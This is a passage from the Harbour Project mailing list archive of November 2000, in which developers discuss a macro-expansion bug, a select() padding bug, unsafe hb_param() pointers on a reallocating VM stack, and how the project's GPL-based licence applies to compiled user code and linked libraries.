> > tracelog(,cStr,               // 'lookup("WHO", Attorney)'
> >    select(),                  // 3, correct workarea
> >    fieldpos("attorney"),      // 3, the correct pos of the Attorney
field
> >    lookup("WHO", Attorney))   // hard-coded same call being expanded
> >
> > Here's the results of the trace. All values are correct:
> > [MEGAFORM] (  541) Called from:
> > >>>NIL<<<
> > >>>lookup("WHO", Attorney)<<<
> > >>>3<<<
> > >>>3<<<
> > >>>All People<<<     // results of hard-coded call to lookup()
> >
> > Here's the offending line:
> >    cType := (nAlias)->(valtype(&(cStr)))
> >
> > What's interesting is that a previous call to another function
> > goes through without an error:
> >    "Age(Opened)"
> > ...also has a field reference (Opened).  The only difference is
> > it has 1 parameter whereas the lookup call has both a string and
> > a field reference.
> >
> > Any help on this one will be greatly appreciated!
> >
> > Brian Hays
> > Abacus Data Systems, Inc
> >
> > P.S. FWIW, This blows with Flex or Simplex.
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Fri Nov 17 03:45:03 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Fri Nov 17 03:45:03 2000
Subject: [Harbour] HB_TRACE
Message-ID: <005601c05072$8db46ec0$8604d2cc@san.rr.com>

Is there a way to get HB_TRACE output displayed in a "debug" window?  (I'm
using FWH).

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Fri Nov 17 03:46:04 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 17 03:46:04 2000
Subject: [Harbour] Harbour license
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKECODHAA.ron@profit-master.com>; from ron@profit-master.com on Thu, Nov 16, 2000 at 04:31:53PM -0800
References: <20001116234650.G18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKKECODHAA.ron@profit-master.com>
Message-ID: <20001117082639.H18577@hagbard.davep.org>

On Thu, Nov 16, 2000 at 04:31:53PM -0800, Ron Pinkas wrote:

> OBJs and LIBs of Harbour compiled code, are NOT subject to any Harbour
> related restriction, as they do NOT include any Harbour License protected
> code.

I think you'll find that John was talking about the HVM and HRL in object or
library form. That is, harbour code itself in that form. the HVM and HRL, in
object or library form *should* be covered by the licence for pretty obvious
reasons.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 17 03:54:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 03:54:02 2000
Subject: [Harbour] Random gpfs
Message-ID: <200011170352_MC2-BB31-F9A9@compuserve.com>

Brian,

"For example:
      pEvalInfo.itmBlock =3D hb_param( 1, HB_IT_BLOCK );
and then pEvalInfo is passed around to other functions"

Maybe that kind of thing should be allowed.

Regardless, I think we need to improve the hb_parXXX() things:

1. all pointers should stay valid until the C function (and anything
it calls) returns back into the pcode loop (and this must work if the
C makes a nested call into the pcode engine)

2. there should also be a way to get a long-lived pointer (one that
survives indefinitely); memcpy/strcpy really isn't good enough

3. there should be some sort of consistency check (audit) facility
which can be called easily from C or PRG code

#3 should at least check every data structure's pointers.

I wish I'd suggested this ages ago.  I _did_ plead with CA to do it
for Clipper (they didn't) so that OM/VM/GC bugs would be easier to
localise (in time) and thus both find and fix.  Harbour should learn
from their mistake. :-)  Memory/pointer problems are too easy to cause
in C.  Dealing with them proactively has to be better than reactively!

I think there's no easy way to add it, but could a start be made?  If
others think it's worthwhile.

John.

From harbour@lists.harbour-project.org  Fri Nov 17 03:54:21 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 03:54:21 2000
Subject: [Harbour] Harbour license
Message-ID: <200011170352_MC2-BB31-F9AB@compuserve.com>

[To Dave Pearson]

BTW, by "OBJ and LIB" I mean those types of file usually understood
to be object and/or library files.  Some systems use different names,
such as archive (rather bizarely).

> However, things like LIB and OBJ files arguably are not. But they shoul=
d
> (probably :-) be included.

"I'd say that they are examples of things that should *not* be included. =
If
someone wishes to distribute the HRL as a binary they should observe the
GPL"

You lost me.  We're talking about things the _user_ wrote, I thought.
Hmm...  except presumably (?) the user's OBJ/LIB/similar don't include
the HRL.  So long as the license makes it clear that the output from
the compiler is the user's to do with as they will, that should be OK.

Even so, OBJ & LIB clearly aren't "executables", just as that term
isn't defined.  OTOH, I don't know if it should be: it's usual not
to define _everything_ (otherwise you include an entire dictionary).
Perhaps "executable" is well-enough understood.  In which case that
leaves OBJ & LIB files.  They're not "applications", either.

It may even be the case that a compiled version of a user's code is
automatically theirs, on the grounds that it's a "mechanical"
transformation.  A license probably could take away that ownership,
but that sounds like something we would not want to do.  Ron appears
to agree. :-)

Dave: sorry, I've not had a chance to ask RMS about the #include issue
(I've been having h/w problems; just staying online has been awkward!).

John.

From harbour@lists.harbour-project.org  Fri Nov 17 03:56:03 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 03:56:03 2000
Subject: [Harbour] bug in macro expander
References: <LOBBKAFMMFGJIKLMEPAKEECPDHAA.ron@profit-master.com> <004e01c05070$d13fea40$8604d2cc@san.rr.com>
Message-ID: <3A14F393.9BB599A8@imid.med.pl>

Brian Hays wrote:
 
> It turns out that it is THAT FUNCTION (LOOKUP) that cannot be referenced in
> macro expansion. I can call the function normally, but inside a macro it
> becomes Undefined.  I've tried using it in macros and &() compilations, and

  Is this function decleared as STATIC ?

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 04:02:03 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Fri Nov 17 04:02:03 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000101c0506f$60a08b60$0f2aa8c0@fivetechs>
References: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com>
Message-ID: <3A150183.11857.35898D@localhost>

Hi Antonio

> Could we change hb_param() to return an index (the parameter index on
> to the stack) instead of returning an address ?

That would be ok only for harbour internal (where we have the 
control). It's even not necessary to modify hb_param() as we could 
directly use stack->pBase + x as needed.
 
> What side effects could we get ?

Probably to instantly break any 3rd party code <g>
 
> That could save many GPFs...

Yes but as we would in all case check all harbour code, I would 
propose first that each of use reread it's code to check all case 
where hb_param is used and to check for potential problem.

The second problem is more a challenge,... how to keep a stack 
management dynamic enough to avoid cl*pper problems but 
without the side effect of having moveable pointer...


See you,
I 

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Fri Nov 17 04:17:03 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 04:17:03 2000
Subject: [Harbour] select() buglet
References: <007601c05019$fa00e120$8604d2cc@san.rr.com>
Message-ID: <3A14F891.3A4FC708@imid.med.pl>

Brian Hays wrote:
 
> Clipper accepts a space-padded string for select(), but Harbour does not and
> returns 0.
> 
> Is anyone else actvely working on the RDD now, or should I hunt this one
> down?

 I am working on RDD. However it is some sort of reworking and
redesigning so it will take some time. I am applying all current changes
so if you can fix it if you have some time.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 04:18:01 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 17 04:18:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <200011170352_MC2-BB31-F9AB@compuserve.com>; from John_Skelton@compuserve.com on Fri, Nov 17, 2000 at 03:52:29AM -0500
References: <200011170352_MC2-BB31-F9AB@compuserve.com>
Message-ID: <20001117091731.L18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 03:52:29AM -0500, John Skelton wrote:

> BTW, by "OBJ and LIB" I mean those types of file usually understood to be
> object and/or library files. Some systems use different names, such as
> archive (rather bizarely).

[Aside] Actually, archive makes as much sense as library to me. A library
and an archive (in the "real life" sense) can serve the same purpose.

> > However, things like LIB and OBJ files arguably are not. But they should
> > (probably :-) be included.
> 
> You lost me. We're talking about things the _user_ wrote, I thought.

Ahh, ok, cross-purposes here. The issue of licence isn't really about user's
code but how they mix that code with code that falls under the GPL (note I
don't mention the harbour exception here, the exception is what we're trying
to explain, it's the GPL that's important here).

So, no, code written by a given user, be it in source, object or library
form isn't covered by the GPL or the harbour exception in any way. Only code
that is *combined* with code under the GPL (harbour code) is spoken to by
the harbour exception.

When you spoke about object and library files I understood you to be talking
about forms of storing the HVM and HRL because, obviously, any object file
or library file that doesn't contain harbour code isn't even relevent to
this discussion.

> It may even be the case that a compiled version of a user's code is
> automatically theirs, on the grounds that it's a "mechanical"
> transformation. A license probably could take away that ownership, but
> that sounds like something we would not want to do. Ron appears to agree.
> :-)

Apologies for my misunderstanding. Ron and you are really talking about
something that is a non-issue. If code isn't combined with code that is
under our licence that it's not "worth talking about", it's non of our
business and the GPL doesn't affect it and the harbour exception doesn't
speak to or about it. Hence my confusion, your mention of this suggested to
be that you were talking about code that is combined with harbour code (this
coming from a discussion about executables, an executable been a form of
distributing user's code that *is* combined with harbour code).

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 17 04:48:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 04:48:01 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <3A150183.11857.35898D@localhost>
Message-ID: <000001c0507b$3995ec20$0f2aa8c0@fivetechs>

I am afraid Harbour can't have a dynamic stack.

hb_param() is used from so many (dangerous!!!) places
all over Harbour source code.

We may find a good size to initialize the stack
and issue an error message if the application runs
out of stack...

:-(

Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 04:57:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 04:57:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000001c0507b$3995ec20$0f2aa8c0@fivetechs>
Message-ID: <000101c0507c$6cee57a0$0f2aa8c0@fivetechs>

Another choice is to review all Harbour source code that
uses hb_param() and fix them. i.e.:

This is a portion of Eval() function:

HB_FUNC( EVAL )
{
   PHB_ITEM pItem = hb_param( 1, HB_IT_BLOCK );

   if( pItem )
   {
      USHORT uiPCount = hb_pcount();
      USHORT uiParam;

      hb_vmPushSymbol( &hb_symEval );   /* The stack may change!!! */
      hb_vmPush( pItem ); <<< This must be changed to
_vmPush( hb_param( 1, HB_IT_BLOCK );


Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 05:04:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Fri Nov 17 05:04:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
References: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com> <3A150183.11857.35898D@localhost>
Message-ID: <3A15023F.F2CA184A@libero.it>

Hi Jean,

this could be feasible if harbour stack (and every other growing
internal structure) becomes a list so when it grows it simply adds a
new  chunk to the list but already allocated items don't move around.

regards.


jflefebv@mafact.com ha scritto:
> 
> 
> The second problem is more a challenge,... how to keep a stack
> management dynamic enough to avoid cl*pper problems but
> without the side effect of having moveable pointer...
> 
> See you,
> I
> 
> Best regards,
> 
> J. Lefebvre <jflefebv@mafact.com>
> Mafact SA/NV
> Belgium
> (See us at http://www.mafact.com)
> jflefebv@mafact.com
> 

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Fri Nov 17 05:06:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 05:06:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000101c0507c$6cee57a0$0f2aa8c0@fivetechs>
Message-ID: <000201c0507d$abc4a820$0f2aa8c0@fivetechs>

Another dangerous use of hb_param() in function AEval()


Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 05:08:02 2000
From: harbour@lists.harbour-project.org (=?iso-8859-1?Q?Ignacio_Ortiz_de_Zu=F1iga?=)
Date: Fri Nov 17 05:08:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000001c0507b$3995ec20$0f2aa8c0@fivetechs>
Message-ID: <IGEGIDKENBOEOHOHFJLNEEHNCHAA.ignacio@fivetech.com>

>>We may find a good size to initialize the stack

Could we also have a high level function to changee the stack size at the
begining of the application?

Regards,

Ignacio Ortiz
Email: ignacio@ozs.com
http: www.ozs.com



From harbour@lists.harbour-project.org  Fri Nov 17 05:12:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Fri Nov 17 05:12:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
References: <000001c0507b$3995ec20$0f2aa8c0@fivetechs>
Message-ID: <006101c0507e$f0d27680$0a0ac8c8@VECWS1>

Antonio,


> I am afraid Harbour can't have a dynamic stack.
> 
> hb_param() is used from so many (dangerous!!!) places
> all over Harbour source code.
> 
> We may find a good size to initialize the stack
> and issue an error message if the application runs
> out of stack...
> 
> :-(

Then we should run some tests (with some really complex apps) to see 
which stack size would be enough, and we should add a command line 
switch (//STACK) to make the default size overridable.

Victor Szakats



From harbour@lists.harbour-project.org  Fri Nov 17 05:20:03 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 05:20:03 2000
Subject: [Harbour] hb_param() and the dynamic stack
References: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com> <3A150183.11857.35898D@localhost>
Message-ID: <3A150740.F4B3D9E6@imid.med.pl>

jflefebv@mafact.com wrote:

> The second problem is more a challenge,... how to keep a stack
> management dynamic enough to avoid cl*pper problems but
> without the side effect of having moveable pointer...

  One of solutions can be changing a behaviour of hb_param() function.
It should return a pointer to new item created dynamically. This item
will have to be dealocated manually or it will be deallocated by the GC.
Probably some uses of hb_param() can be changed so a reference to an
item can be used.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 05:28:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Fri Nov 17 05:28:01 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <3A150740.F4B3D9E6@imid.med.pl>
Message-ID: <000301c05080$caf0f980$0f2aa8c0@fivetechs>

Ryszard,

> One of solutions can be changing a behaviour of hb_param() function.
> It should return a pointer to new item created dynamically.

hb_param() is used so many places, so that change will slow down
Harbour very much.

I have been reviewing many rtl functions that use hb_param() and there
are no dangers there, as the item is used inmediately without any
possibility
of a stack reallocation.

In my opinion, we could fix those real dangerous places first... before
changing the actual architecture.

Antonio


From harbour@lists.harbour-project.org  Fri Nov 17 07:52:02 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Fri Nov 17 07:52:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
References: <000001c05063$8267d0c0$239be6c3@yasco.mail.ylt.crimea.com> <3A150183.11857.35898D@localhost> <3A15023F.F2CA184A@libero.it>
Message-ID: <005e01c0509d$3b7c8e00$456410ac@jharrier>

This is the best & securest solution. I've seen it implemented on the
Protheus xBase application server. The stack is not a chunk of memory, but a
list of items that can be pushed & poped. Pointers are valid until poped.
But maybe this is a TOO BIG change to Harbour...

Regards
Harrier

----- Original Message -----
From: "Maurilio Longo" <maurilio.longo@libero.it>
To: <harbour@lists.harbour-project.org>
Sent: Friday, November 17, 2000 6:02 AM
Subject: Re: [Harbour] hb_param() and the dynamic stack


> Hi Jean,
>
> this could be feasible if harbour stack (and every other growing
> internal structure) becomes a list so when it grows it simply adds a
> new  chunk to the list but already allocated items don't move around.
>
> regards.
>
>
> jflefebv@mafact.com ha scritto:
> >
> >
> > The second problem is more a challenge,... how to keep a stack
> > management dynamic enough to avoid cl*pper problems but
> > without the side effect of having moveable pointer...
> >
> > See you,
> > I
> >
> > Best regards,
> >
> > J. Lefebvre <jflefebv@mafact.com>
> > Mafact SA/NV
> > Belgium
> > (See us at http://www.mafact.com)
> > jflefebv@mafact.com
> >
>
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Fri Nov 17 07:52:20 2000
From: harbour@lists.harbour-project.org (Juan Agustin Barriga)
Date: Fri Nov 17 07:52:20 2000
Subject: [Harbour] select() buglet
References: <007601c05019$fa00e120$8604d2cc@san.rr.com>
Message-ID: <005f01c0509d$3bcf1ad0$456410ac@jharrier>

There should be a TrimAll on dbcmd.c DBSELECTAREA after obtaining szArea.
Something like:

   if( ISCHAR( 1 ) )
   {
      szAlias = hb_parc( 1 );
      while (*szAlias == ' ' )
         *szAlias++;
      char *end = strchr( szAlias, 0 );
      end--;
      while ( *end == ' ' && end > szAlias )
        *(end--) = 0;
      ulLen = strlen( szAlias );
...

   Maybe there's allready a function that does the trim.

Regards
Harrier

----- Original Message -----
From: "Brian Hays" <bhays@abacuslaw.com>
To: <harbour@lists.harbour-project.org>
Sent: Thursday, November 16, 2000 6:10 PM
Subject: [Harbour] select() buglet


> Clipper accepts a space-padded string for select(), but Harbour does not
and
> returns 0.
>
> Is anyone else actvely working on the RDD now, or should I hunt this one
> down?
>
> Brian
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Fri Nov 17 08:54:02 2000
From: harbour@lists.harbour-project.org (Jacek Potempa)
Date: Fri Nov 17 08:54:02 2000
Subject: [Harbour] Harbour license - example
Message-ID: <NOEPIKLDCODGGHOPAHEEMELGCCAA.Jacek.Potempa@otc.pl>

To all.

I'm still unsure about the license interpretation,  so
I'd like to provide an example to make the discussion more specific.

Typical way of using Harbour is writing *.PRG code, which eventually use
the exposed Clipper-compatible APIs (such as EXTEND API and RDD API).

Now imagine, that you want to give up the *.PRG part of your code, and
write everything in C or C++ using EXTEND, RDD and other APIs available
in Harbour. 

Then, for distribution purposes, you put the Harbour HRL/HVM libraries
and your code into the DLL or COM object, which provides the interface
for the end user (i.e. the user of commercial software). No changes
are introduced into the original Harbour code,
only OBJ/LIB files are linked.

Following the HARBOUR PROJECT LICENSE,
is it legal to produce and distribute such a product?

Jacek Potempa
OTC S.A.
Jacek.Potempa@otc.pl
http://www.otc.pl


From harbour@lists.harbour-project.org  Fri Nov 17 09:12:01 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Fri Nov 17 09:12:01 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <3A15023F.F2CA184A@libero.it>
Message-ID: <3A154A38.21517.1519614@localhost>

Hi Maurilio

> this could be feasible if harbour stack (and every other growing
> internal structure) becomes a list so when it grows it simply adds a
> new  chunk to the list but already allocated items don't move around.

Yes, really good idea ... and should not be too difficult to 
implement.

> 
> 
> jflefebv@mafact.com ha scritto:
> > 
> > 
> > The second problem is more a challenge,... how to keep a stack
> > management dynamic enough to avoid cl*pper problems but
> > without the side effect of having moveable pointer...
> > 
> > See you,
> > I
> > 
> > Best regards,
> > 
> > J. Lefebvre <jflefebv@mafact.com>
> > Mafact SA/NV
> > Belgium
> > (See us at http://www.mafact.com)
> > jflefebv@mafact.com
> > 
> 
> -- 
>  __________                   
> |  |  | |__| md2520@mclink.it 
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Fri Nov 17 09:14:03 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Fri Nov 17 09:14:03 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <000301c05080$caf0f980$0f2aa8c0@fivetechs>
References: <3A150740.F4B3D9E6@imid.med.pl>
Message-ID: <3A154B24.26852.15530B1@localhost>

Hi Antonio

> Ryszard,
> 
> > One of solutions can be changing a behaviour of hb_param() function.
> > It should return a pointer to new item created dynamically.
> 
> hb_param() is used so many places, so that change will slow down
> Harbour very much.
> 
> I have been reviewing many rtl functions that use hb_param() and there
> are no dangers there, as the item is used inmediately without any
> possibility of a stack reallocation.
> 
> In my opinion, we could fix those real dangerous places first...
> before changing the actual architecture.

I agree, I don't thinks it's too much work to do. Then we will have 
enough time to have a real reflexion about this subject. I really like 
the Idea of Maurillio about a linked list.

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Fri Nov 17 09:16:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Fri Nov 17 09:16:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
In-Reply-To: <005e01c0509d$3b7c8e00$456410ac@jharrier>
Message-ID: <3A154B9F.135.1570E89@localhost>

Hi Juan

This is the same idea as maurillio and I think it's the best one (up 
to now). 

> This is the best & securest solution. I've seen it implemented on the
> Protheus xBase application server. The stack is not a chunk of memory,
> but a list of items that can be pushed & poped. Pointers are valid
> until poped.

> But maybe this is a TOO BIG change to Harbour...

TOO BIG ??? Who say that ;-))))

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Fri Nov 17 09:20:05 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 17 09:20:05 2000
Subject: [Harbour] Harbour license - example
In-Reply-To: <NOEPIKLDCODGGHOPAHEEMELGCCAA.Jacek.Potempa@otc.pl>; from Jacek.Potempa@otc.pl on Fri, Nov 17, 2000 at 02:49:53PM +0100
References: <NOEPIKLDCODGGHOPAHEEMELGCCAA.Jacek.Potempa@otc.pl>
Message-ID: <20001117141933.R18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 02:49:53PM +0100, Jacek Potempa wrote:

> Then, for distribution purposes, you put the Harbour HRL/HVM libraries and
> your code into the DLL or COM object, which provides the interface for the
> end user (i.e. the user of commercial software). No changes are introduced
> into the original Harbour code, only OBJ/LIB files are linked.

You seem to be simply extending the HRL and HVM, in which case you'd have to
distribute your code under a licence that is compatible with the GPL.
Failing that you'd distribute your extensions as separate entities, in which
case you'd be able to use your own licence for your code but you'd have to
observe the GPL for your distribution of the HRL and HVM.

But another way, why would you want to distribute the HVM if you're not
distributing any harbour bytecode objects?

> Following the HARBOUR PROJECT LICENSE,
> is it legal to produce and distribute such a product?

Yes, it's legal, depending on the licence you choose.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 17 10:02:01 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Fri Nov 17 10:02:01 2000
Subject: [Harbour] Harbour license
Message-ID: <200011171001_MC2-BB32-99D7@compuserve.com>

[To Dave Pearson]

"archive makes as much sense as library to me"

Adding yet another term for something which already had a good enough
name (well, more than one) didn't strike me as useful.

"So, no, code written by a given user, be it in source, object or library=

form isn't covered by the GPL or the harbour exception in any way. Only c=
ode
that is *combined* with code under the GPL (harbour code) is spoken to by=

the harbour exception."

The files the compiler outputs generally seem to contain things which
_might_ be construed as Harbour code.  E.g. looking at some C there's
lots of stuff that each has in common.  It's "obvious" that that's
not supposed to be included in what is Harbour code, just as using
#include files when compiling is also meant to be OK (and the C from
Harbour's compiler #includes 3 files at the moment).  I don't think
it's actually stated explicitly, however.  Jacek: is this what was
worrying you?

John.

From harbour@lists.harbour-project.org  Fri Nov 17 10:17:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Fri Nov 17 10:17:02 2000
Subject: [Harbour] hb_param() and the dynamic stack
References: <3A150740.F4B3D9E6@imid.med.pl> <3A154B24.26852.15530B1@localhost>
Message-ID: <3A154CBB.AAC3B730@imid.med.pl>

jflefebv@mafact.com wrote:

> I agree, I don't thinks it's too much work to do. Then we will have
> enough time to have a real reflexion about this subject. I really like
> the Idea of Maurillio about a linked list.

  Yes it is a good idea. It shouldn't be a problem even for variables
passed by reference because we are already storing the offset and the
base address of the stack - in this case we will store the address of a
list with a stack piece.

Regards, Ryszard

From harbour@lists.harbour-project.org  Fri Nov 17 10:31:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Fri Nov 17 10:31:02 2000
Subject: [Harbour] Harbour license
In-Reply-To: <200011171001_MC2-BB32-99D7@compuserve.com>; from John_Skelton@compuserve.com on Fri, Nov 17, 2000 at 10:00:53AM -0500
References: <200011171001_MC2-BB32-99D7@compuserve.com>
Message-ID: <20001117153044.V18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 10:00:53AM -0500, John Skelton wrote:

> "archive makes as much sense as library to me"
> 
> Adding yet another term for something which already had a good enough name
> (well, more than one) didn't strike me as useful.

Agreed, however, human languages tend to be full of redundancy. Now, which
came first, library or archive? ;>

> "So, no, code written by a given user, be it in source, object or library
> form isn't covered by the GPL or the harbour exception in any way. Only
> code that is *combined* with code under the GPL (harbour code) is spoken
> to by the harbour exception."
> 
> The files the compiler outputs generally seem to contain things which
> _might_ be construed as Harbour code. E.g. looking at some C there's lots
> of stuff that each has in common. 

What would be an example of this?

>                                   It's "obvious" that that's not supposed
> to be included in what is Harbour code, just as using #include files when
> compiling is also meant to be OK (and the C from Harbour's compiler
> #includes 3 files at the moment). I don't think it's actually stated
> explicitly, however. Jacek: is this what was worrying you?

Licence issues are really hard to get right, really really hard. I'm
starting to wonder if it might be worth writing a licence-clarification
document. The problem here is that the harbour exception was added far too
quickly and no thought was really given to the issues involved.

It happened when I suggested that one solution to the GPL/LGPL problem was
the guile <URL:http://www.gnu.org/software/guile/guile.html> exception.
Before anything could be discussed someone (I forget who now) took it,
changed a few words and started applying it. Harbour licence situation is
less than optimal and I'm concerned that adding a document to describe the
*desires* of the developers regarding licensing is missing the point. If we
were to do that then that document should really be the exception.

Licence in haste, repent in leisure. ;>

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Fri Nov 17 12:00:05 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Fri Nov 17 12:00:05 2000
Subject: [Harbour] Harbour license
In-Reply-To: <20001117153044.V18577@hagbard.davep.org>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>

Dave,

I believe the concerns are far simpler than are described here.

There are 2 issues, users appear to be concerned with, and I don't see
addressed in the short "License Header" included within most our source
files.

1. Is the output of the compiler, in the form of the generated C, Java,
Win32 Object, and HRB, resulting from USER developed PRG code, subject to
any Harbour License Restrictions, or control?

   The answer is a CLEAR NO! But I doubt it come across that way, from
reading the "License Header".

2. Does linking HVM/HRL code, along with compiled code as described in 1
above, subjecting the resulted linked form to any Harbour License
Restrictions?

   Here the answer is clear (NO!), *only* if the resulted form *is* a
traditional executable. It becomes far more complicated, if the resulting
entity exposes API services of the HVM or RTL.

I believe this is where the core of the matter is. Assume for a second, that
John Doe developed a Harbour compatible PCODE compiler, but he didn't bother
developing the RTL or HVM. Surely, we don't won't to allow Mr. Doe, to
distribute the Harbour HVM/RTL, in ANY form, capable of servicing the PCODE
output of his compiler, *unless* subjecting the resulted form to the Harbour
License Agreement.

OTH, we do want to allow, valid uses of scripting, macro, etc, such as with
DOT for example. I believe the only easy answer is to establish 3 separate
licenses for the respective Harbour sub systems, Compiler, Virtual Machine,
and Run-Time support.

Here is my proposal:

1. The License for the Harbour Compiler (source files involved with building
Harbour.exe) should be strait forward, indicating, that any use of these
source files, subjects the derived work/distribution to the GPL. It should
further be clear that the compiled output of any user's prg code, compiled
by the compiler application, is *not* subject to any Harbour License
Restrictions.

2. The License for the RTL (source files involved with building the Harbour
Run-Time Libraries) should clearly state, that any use of these source
files, subjects the derived work/distribution to the GPL. It should further
be clear that the *compiled* form of these files *can* be linked with source
files generated by the Harbour Compiler, and can service such Harbour
generated source code, compiled by the compiler application, *without*
subjecting the resulted form, to any Harbour License Restrictions.

3. The License for the HVM (source files involved with building the Harbour
Virtual Machine) should clearly state, that any use of these source files,
subjects the derived work/distribution to the GPL. It should further be
clear that the *compiled* form of these files *can* be linked with source
files generated by the Harbour Compiler, and can service such Harbour
generated source code, compiled by the Harbour compiler application, without
subjecting the resulted form, to any Harbour License Restrictions.

Ron

> > "archive makes as much sense as library to me"
> >
> > Adding yet another term for something which already had a good
> enough name
> > (well, more than one) didn't strike me as useful.
>
> Agreed, however, human languages tend to be full of redundancy. Now, which
> came first, library or archive? ;>
>
> > "So, no, code written by a given user, be it in source, object
> or library
> > form isn't covered by the GPL or the harbour exception in any way. Only
> > code that is *combined* with code under the GPL (harbour code) is spoken
> > to by the harbour exception."
> >
> > The files the compiler outputs generally seem to contain things which
> > _might_ be construed as Harbour code. E.g. looking at some C
